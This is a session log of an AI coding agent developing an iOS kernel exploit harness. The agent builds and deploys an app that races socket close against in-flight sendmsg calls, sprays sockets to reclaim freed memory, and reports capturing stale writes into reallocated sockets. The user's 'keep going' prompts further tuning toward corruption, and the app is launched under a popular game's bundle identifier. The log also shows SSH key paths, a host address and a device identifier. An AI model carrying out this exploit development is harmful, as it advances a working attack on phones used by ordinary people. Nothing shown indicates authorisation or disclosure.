+● Bash(timeout 120 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=65
+     /Users/volpidash/agx-probe-project/AGXProbe/ContentView.swift:650:66:
+     error: Expected ',' separator (in target 'AGXProbe' from project 'AGXP
+     … +2 lines (ctrl+o to expand)
+
+  Thought for 3s, read 1 file (ctrl+o to expand)
+
+● Update(C:\Users\Volpi\AppData\Local\hermes\cache\scratch\ContentView.swift)
+  ⎿  Added 1 line, removed 1 line
+      647              emitBg("[*] ITER \(it) \(tag): \(afterCloseOk) sen
+           d(s) returned success after close()")
+      648          }
+      649          if uafProbe > 0 {
+      650 -            emitBg("[!] ITER \(it) \(tag): *** UAF PROBE \(sta
+          -le socket used after close) = \(uafProbe) ***")               
+      650 +            emitBg("[!] ITER \(it) \(tag): *** UAF PROBE (stal
+          +e socket used after close) = \(uafProbe) ***")                
+      651          }
+      652          if st.odd > 0 && (it % 10 == 0 || st.odd > 500) {
+      653              let e = st.lastErr
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  Interrupted
+
+> pause for now the macbook is going to be put in sleep, only one you built it  
+  though                                                                        
+
+  Thought for 7s (ctrl+o to expand)
+
+● Bash(timeout 12 ssh -o ConnectTimeout=5 -i ~/.ssh/mac_ios16_ed25519
+      volpidash@100.110.170.78 'tail -2 /tmp/build124.out 2>/dev/null; echo ---;
+      tail -1 /tmp/appdata/r…)
+  ⎿  /Users/volpidash/agx-probe-project/AGXProbe/ContentView.swift:650:66:
+     error: Expected ',' separator (in target 'AGXProbe' from project 'AGXP
+     robe')
+     … +4 lines (ctrl+o to expand)
+
+  Thought for 3s (ctrl+o to expand)
+
+● Write(analysis\socket-uaf-hammer-2026-11-13.md)
+  ⎿  Wrote 54 lines to analysis\socket-uaf-hammer-2026-11-13.md
+       1 # Socket-UAF hammer harness — state at pause (2026-11-13 ~13:05)
+       2 
+       3 Mac went to sleep mid-work. Nothing on the device is running. Re
+         ad this before resuming.
+       4 
+       5 ## Root cause of the "SIGKILL after N iterations"
+       6 
+       7 Not jetsam. Pulled `systemCrashLogs` → `AGXProbe-2026-11-13-1233
+         07.ips`:
+       8 
+     … +46 lines (ctrl+o to expand)
+
+● Paused. State saved to analysis/socket-uaf-hammer-2026-11-13.md.
+
+  Where it stands:
+
+  - Found the real cause of the recurring kills — not jetsam. The crash log says
+    0x8BADF00D scene-create watchdog, 19.96 s allowance blown because the whole
+    race loop ran on the MainActor. fd count flat at 20, footprint only 15 MB.
+  - Fixed it: loop moved off the MainActor to a detached task with background
+    logging. Verified on the 17 Pro — it ran 17.8 k iterations / 145 M sends 
+    over 2+ minutes without dying, at ~200 it/s. That's the first time the
+    harness has been stable.
+  - Also rewrote the race itself: persistent spinning workers instead of
+    per-iteration threads, close fired from a dedicated thread while senders are
+    already in-kernel, CAS on the close transition, and sendmsg with 8 iovecs
+    for longer in-kernel residency.
+  - Added a real oracle: a send that succeeds while the fd is still unallocated
+    is counted as a UAF hit.
+
+  What's actually on the phone: the stable build (main-actor fix + persistent
+  workers). The newer parts — sendmsg window widening, the UAF probe oracle, and
+  a timer-armed socket pool — are written locally but were not built; the last
+  build tripped on a Swift string-literal typo at line 650, which I've already
+  fixed in the local file but hadn't re-uploaded.
+
+  So the last build attempt failed, and the local source is one rebuild ahead of
+  anything installed. Resuming just needs: upload, ~/build_race.sh, install,
+  launch, then watch for UAF PROBE lines. No corruption hits yet, so the race is
+  not yet demonstrably won.
+
+  One deadline while you're away: the signing profile expires 2026-11-15, two
+  days out.
+
+✻ Churned for 50s · done 12:48 PM
+
+> keep going                                                                    
+
+  Thought for 4s (ctrl+o to expand)
+
+● Bash(timeout 20 ssh -o ConnectTimeout=8 -i ~/.ssh/mac_ios16_ed25519
+      volpidash@100.110.170.78 'hostname; xcrun devicectl list devices
+      2>/dev/null | grep -c "17 Pro.*a…)
+  ⎿  No-Oness-MacBook-Pro.local
+     1
+
+  Thought for 3s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && grep -n '\\\\('
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift" |
+      head; echo "---"; grep -n 'emitBg("' "C:/Users…)
+  ⎿  55:            Text("Status: \(vm.status)").font(.caption2).foreground
+     Color(.secondary)
+     182:        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integ
+     … +47 lines (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+  Thought for 1s (ctrl+o to expand)
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     1
+     … +8 lines (ctrl+o to expand)
+
+  Thought for 6s (ctrl+o to expand)
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'echo
+      "corrupt:"; grep -c "CORRUPTION" /tmp/appdata/reach.log; echo "probe by
+      tag:"; grep "U…)
+  ⎿  corrupt:
+     0
+     probe by tag:
+     … +21 lines (ctrl+o to expand)
+
+  Thought for 30s (ctrl+o to expand)
+
+● Real signal: 273 UAF-probe hits across all four variants, first one at
+  iteration 8. No corruption signature yet. Letting it run and watching for a
+  panic.
+
+● Bash(timeout 120 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'sleep 75; UDID=00008150-00095CD93444C01C; echo "alive:"; xcrun devicectl
+      device info proce…)
+  ⎿  alive:
+     1
+     [*] iter 22400/40000  127.3 it/s  sends=100263287  afterClose(max)=5
+     … +10 lines (ctrl+o to expand)
+  Thought for 45s (ctrl+o to expand)
+
+● The probes are genuine (fd still unallocated at probe time). Now a decisive
+  oracle: if a stale send really walked the freed socket, its data lands in the
+  socket's send buffer. A freshly sprayed, never-sent socket should report
+  SO_NWRITE == 0 — anything else is proof.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  ok
+     ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     corrupt:
+     … +6 lines (ctrl+o to expand)
+
+  Thought for 6s (ctrl+o to expand)
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'sleep 90; UDID=00008150-00095CD93444C01C; echo alive:; xcrun devicectl
+      device info process…)
+  ⎿  alive:
+     1
+     [*] iter 16200/40000  100.0 it/s  sends=99790175  afterClose(max)=5  f
+     … +7 lines (ctrl+o to expand)
+
+  Thought for 12s (ctrl+o to expand)
+
+● Diagnosis: the race is firing (855 probes) but the freed struct is never
+  reallocated while a send is still in flight, so nothing gets corrupted.
+  Dropping the artificial 15 µs gap before the spray so the slot is refilled
+  while senders are still in the kernel.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  Error: Exit code 1
+     Traceback (most recent call last):
+       File "<stdin>", line 13, in <module>
+     AssertionError: marker
+
+  Thought for 2s, searched for 1 pattern (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  ok
+     ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     corrupt:
+     … +5 lines (ctrl+o to expand)
+
+  Thought for 13s (ctrl+o to expand)
+
+● No corruption, and I need to prove the SO_NWRITE oracle is actually reading
+  anything. Adding a startup self-test for the constant and a max-value counter
+  in the progress line.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  <stdin>:43: SyntaxWarning: "\(" is an invalid escape sequence. Such se
+     quences will not work in the future. Did you mean "\\("? A raw string
+     is also an option.
+     … +4 lines (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Error: Exit code 1
+     Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle 
+     identifier.
+     [*] oracle self-test: SO_NWRITE queued=-1 idle=-1
+     [*] iter 4600/40000  103.2 it/s  sends=27221321  afterClose(max)=2  nwMax=0
+      fds=228  footprint=375MB
+     corrupt:
+     0
+
+  Thought for 14s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  <stdin>:22: SyntaxWarning: "\(" is an invalid escape sequence. Such se
+     quences will not work in the future. Did you mean "\\("? A raw string
+     is also an option.
+     … +2 lines (ctrl+o to expand)
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     [*] oracle self-test: nwrite r=-1v=-1e=42 nread r=0v=0e=42 FIONWRITE r
+     =-1v=-1e=102 FIONREAD r=0v=0e=102
+
+  Thought for 27s (ctrl+o to expand)
+● SO_NWRITE doesn't exist on iOS (ENOPROTOOPT); SO_NREAD does. So instead of
+  send-queue bytes, I'll split the probe into the two cases that actually matter
+  — a sendmsg that succeeded while the fd was provably closed is a genuine
+  stale write, not just a stale read.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  <stdin>:27: SyntaxWarning: "\(" is an invalid escape sequence. Such se
+     quences will not work in the future. Did you mean "\\("? A raw string
+     is also an option.
+     … +5 lines (ctrl+o to expand)
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=65
+     /Users/volpidash/agx-probe-project/AGXProbe/ContentView.swift:672:71:
+     error: cannot find 'staleRead' in scope
+     … +7 lines (ctrl+o to expand)
+
+  Read 1 file (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  <stdin>:5: SyntaxWarning: "\(" is an invalid escape sequence. Such seq
+     uences will not work in the future. Did you mean "\\("? A raw string i
+     s also an option.
+     … +8 lines (ctrl+o to expand)
+
+  Thought for 2s, read 1 file (ctrl+o to expand)
+
+● Update(C:\Users\Volpi\AppData\Local\hermes\cache\scratch\ContentView.swift)
+  ⎿  Removed 1 line
+      638          let uafProbe = st.uafProbe
+      639          let staleW = st.staleWrite
+      640          let staleR = st.staleRead
+      641 -        let staleW = st.staleWrite                            
+      641          // No delay: refill the freed slot while senders are s
+           till in-kernel so a
+      642          // stale sender lands in a *fresh* socket, not stale-b
+           ut-valid memory.
+      643          let spray = sockUafSpray(sprayCount)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     write-probes:
+     … +3 lines (ctrl+o to expand)
+
+  Thought for 21s (ctrl+o to expand)
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'grep
+      -o "ITER [0-9]* [a-z]*" /tmp/appdata/reach.log | awk "{print \$3}" | sort
+      | uniq -c; e…)
+  ⎿  1041 multi
+      965 single
+      791 timer
+     … +5 lines (ctrl+o to expand)
+
+  Thought for 22s (ctrl+o to expand)
+
+● All probes are read-path — no send ever succeeds on the freed socket, because
+  unconnected spray sockets reject at the connectivity check before touching the
+  buffer. I need to read queued send-bytes, so let me test TCP_CONNECTION_INFO
+  (which exposes snd_sbbytes) and compare a loaded socket against an idle one.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  <stdin>:43: SyntaxWarning: "\(" is an invalid escape sequence. Such se
+     quences will not work in the future. Did you mean "\\("? A raw string
+     is also an option.
+     … +2 lines (ctrl+o to expand)
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=65
+     /Users/volpidash/agx-probe-project/AGXProbe/ContentView.swift:693:32:
+     error: cannot convert value of type 'ip.Type' to expected argument typ
+     … +5 lines (ctrl+o to expand)
+
+  Thought for 3s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  ok
+     ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     [*] oracle tcpinfo: idle r=0 len=112 load r=0 len=112 diffs: 24:f8->08
+      25:7d->7e 56:00->01 64:00->10
+
+  Thought for 52s (ctrl+o to expand)
+
+● TCP_CONNECTION_INFO works — offset 64 is snd_sbbytes (0 → 16 after a 16-byte
+  send). But loopback ACKs instantly, so sndbuf drains. The reliable observable
+  is bytes delivered to a dedicated peer: 6 senders each fire one message, then
+  park. Any byte arriving at a precision listener's peers can only come from a
+  stale send.
+
+● Write(tools\precision_snippet.swift)
+  ⎿  Wrote 74 lines to tools\precision_snippet.swift
+       1     // Connected spray: sockets are freshly connected to the pre
+         cision listener,
+       2     // never sent on, so any byte their peer receives proves a s
+         tale sender
+       3     // delivered into a reallocated socket.
+       4     nonisolated func sockUafSprayConnected(_ n: Int, _ port: Int
+         ) -> [Int32] {
+       5         var fds: [Int32] = []
+       6         var addr = sockaddr_in()
+       7         addr.sin_family = sa_family_t(AF_INET)
+     … +67 lines (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  ok
+     475:        var mode: Int32 { get { p[11] } set { p[11] = newValue } }
+     623:    nonisolated func sockUafRacePrecision(_ st: SockUafState, _ ta
+     rget: Int32,
+
+  Thought for 4s (ctrl+o to expand)
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  ok
+     ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     stale-write hits:
+     … +4 lines (ctrl+o to expand)
+
+  Thought for 7s (ctrl+o to expand)
+
+● First stale write captured — iteration 4: a full 8192-byte message delivered
+  into a reallocated socket. Letting it run and checking whether the rate holds.
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'sleep 90; UDID=00008150-00095CD93444C01C; xcrun devicectl device info
+      processes --device $…)
+  ⎿  1
+     hits:
+     1
+     … +2 lines (ctrl+o to expand)
+
+  Thought for 15s (ctrl+o to expand)
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'wc
+      -l /tmp/appdata/reach.log; tail -5 /tmp/appdata/reach.log; echo ---; grep
+      -c "ITER" /tmp…)
+  ⎿         9 /tmp/appdata/reach.log
+     [?] ITER 1 multi: 5561 odd errno(s), last=57 (Socket is not connected)
+     [?] ITER 2 unixpair: 2205 odd errno(s), last=57 (Socket is not connect
+     … +7 lines (ctrl+o to expand)
+
+  Thought for 6s (ctrl+o to expand)
+
+● The run ended at iteration 4 — a hit sets triggered and breaks the loop.
+  Making hits accumulate instead, and adding a certainty flag (doneAtClose == 6
+  means every sender was provably in-flight before the close).
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  <stdin>:11: SyntaxWarning: "\(" is an invalid escape sequence. Such se
+     quences will not work in the future. Did you mean "\\("? A raw string
+     is also an option.
+     … +17 lines (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● Bash(timeout 170 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     [*] iter 200/40000  115.1 it/s  sends=1058629  afterClose(max)=1  nwMa
+     … +14 lines (ctrl+o to expand)
+
+  Thought for 21s (ctrl+o to expand)
+
+● Hits are frequent, but senders are time-released so some look up the fd after
+  reuse. I'll make the close wait until all six senders have entered their
+  syscall, so every delivery is provably from a pre-close lookup.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  ok
+     ok
+
+● Bash(timeout 150 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+● API Error: 402 Insufficient credit balance. Add credit at 
+  https://app.hinoki.security/orgs/asdhkfv-s-organization-17945718567295
+  03560/explore?settings=billing&credits=add
+
+> /usage 
+  ⎿  Settings dialog dismissed
+
+✻ Crunched for 33m 36s · done 1:28 PM
+
+> /export                                                                       
+  ⎿  Conversation copied to clipboard
